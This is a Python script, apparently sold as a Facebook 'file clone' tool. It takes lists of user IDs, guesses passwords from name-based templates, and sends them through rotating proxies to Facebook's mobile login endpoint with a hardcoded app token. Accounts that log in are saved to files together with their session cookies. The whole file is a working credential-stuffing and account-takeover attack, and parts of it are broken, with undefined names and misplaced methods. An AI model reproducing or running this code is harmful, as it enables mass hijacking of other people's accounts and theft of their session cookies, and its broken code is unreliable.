#SC MAKE BY HABIB HOSSAIN
#WORKING SCRIPT SELLER
#__________________IMPORT____________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#________________PROXY______________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
#________________LOOP______________#
loop,ok,cp,user = 1,[],[],[]
cok,plist = [],[]
#________________COLOUR______________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________LINE____________#
def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
        os.system(f'clear')
        print(logo)
#________________UA______________#
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"[FBAN/Orca-Android;FBAV/22.0.0.4248;FBBV/4046526;[FBAN/Orca-Android;FBAV/251.0.0.31.111;FBBV/188827985;FBDM/density=3.0,width=720,height=1440;FBLC/en_US;FBCR/Orange;FBMF/Archos;FBBD/archos;FBPN/com.facebook.orca;FBDV/Archos Oxygen 57;FBSV/9;nullFBCA/arm64-v8a:;]"
	return ua
#__________________LOGO____________#
logo=(f"""
       {G1}███████ {Y}██     ██  {M}█████   {S}██████
       {G2}██      {Y}██     ██ {M}██   ██ {S}██
       {G3}███████ {Y}██  █  ██ {M}███████ {S}██   ███
       {G4}     ██ {Y}██ ███ ██ {M}██   ██ {S}██    ██
       {G5}███████  {Y}███ ███  {M}██   ██  {S}██████
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} HABIB\_____ :* \❷/ 3:) \⓿
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}1.2
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} SCRIPT SELL
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONE ')
    
    print(f'{G1}[{A}0{G1}]{G1} EXIT TOOL ')
    linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        XXX()
    elif sex in ['3']:
        os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
#__________________FILE DEF____________#
def _file_():
    global methods
    clear()
    print(f'\033[38;5;46m[\033[38;5;46m1\033[38;5;46m] METHOD \033[38;5;46m[\033[38;5;46mM1\033[38;5;46m]\033[38;5;46m ')
    print(f'\033[38;5;46m[\033[38;5;46m2\033[38;5;46m] METHOD \033[38;5;46m[\033[38;5;46mM2\033[38;5;46m]\033[38;5;46m ')
    print(f'\033[38;5;46m[\033[38;5;46m3\033[38;5;46m] METHOD \033[38;5;46m[\033[38;5;46mM3\033[38;5;46m]\033[38;5;46m ')
    linex()
    option = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] CHOICE \033[38;5;46m:\033[38;5;46m ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] VALID OPTION')
      time.sleep(2)
      _file_()
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m /sdcard/MRX.txt');linex()
        self.file = input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] FILE NAME \033[38;5;46m:\033[38;5;46m ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)       
    def pasw(self):       
            pw = []
            clear()
            print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] PASSWORD LIMIT \033[38;5;46m:\033[38;5;46m '))
            clear()
            print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] EXAMPLE \033[38;5;46m:\033[38;5;46m first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] PASSWORD NO \033[38;5;46m[\033[38;5;46m{sr+1}\033[38;5;46m] \033[38;5;46m:\033[38;5;46m '))
            clear()
            print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOTAL FILE UID \033[38;5;46m:\033[38;5;46m %s ' % len(self.id))
            print(f'\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] PASSWORD LIMIT \033[38;5;46m:\033[38;5;46m {sl} ')
            print(f'\x1b[38;5;46m[\x1b[38;5;46m=\x1b[38;5;46m] FIRST \033[1;37m[\033[38;5;196mON\033[1;97m|\033[38;5;196mOFF\033[1;37m] \033[38;5;46mAIRPLANE MODE FOR SPEED')
            linex()
            with Bikash(max_workers=30) as MRXworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                MRXworld.submit(self.methodA,uid,name,pwx)
                            elif 'methodB' in methods:
                                MRXworld.submit(self.methodB,uid,name, pwx)
                            elif 'methodC' in methods:
                                MRXworld.submit(self.methodC,uid,name, pwx)
                   except:pass
            result(oks,cps)          
#__________________FILE METHOD____________#
def methodA(self,sid,name,psw):
        try:
            global loop,oks,cps
            mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU', 'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U', 'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880', 'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN', 'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F', 'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N', 'SM-N960W', 'SM-N960X', 'SCV40'])
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/192.0.0.68.14;FBBV/36024220;[FBAN/FB4A;FBAV/192.0.0.68.14;FBLC/en_US;FBBV/36024220;FBCR/Unicom;FBMF/Realme;FBBD/Realme;FBPN/messenger-android;FBDV/RMX3709;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1243,height=1971]"
            sys.stdout.write(f"\r\033[38;5;46m[\033[38;5;46mMRX-M1\033[38;5;46m] \033[38;5;46m{loop}\033[38;5;46m \033[38;5;46m|\033[38;5;46m OK\033[38;5;46m|\033[38;5;46mCP \033[38;5;46m{len(oks)}\033[38;5;46m|\033[38;5;46m{len(cps)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())               
                with requests.Session() as session:
                    data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {
                    'User-Agent': Mrxua(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'Connection':'close',
                    'cache-control': 'no-cache',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'WIFI',
                    'X-Tigon-Is-Retry': 'False',
                    'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'X-fb-device-group': str(random.randint(2000, 4000)),
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);MRXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={MRXb};{ckkk}"
                    print(f"\r\r\033[38;5;46m[BUHAY-LIVE] {sid} | {ps} ")
                    print(f"\r\r\033[38;5;46m[COOKIES-BUHAY]<>{O}{cookie} ")
                    open('/sdcard/BUHAY-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[PATAY-CP] {sid} | {ps} ")
                    open('/sdcard/PATAY-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)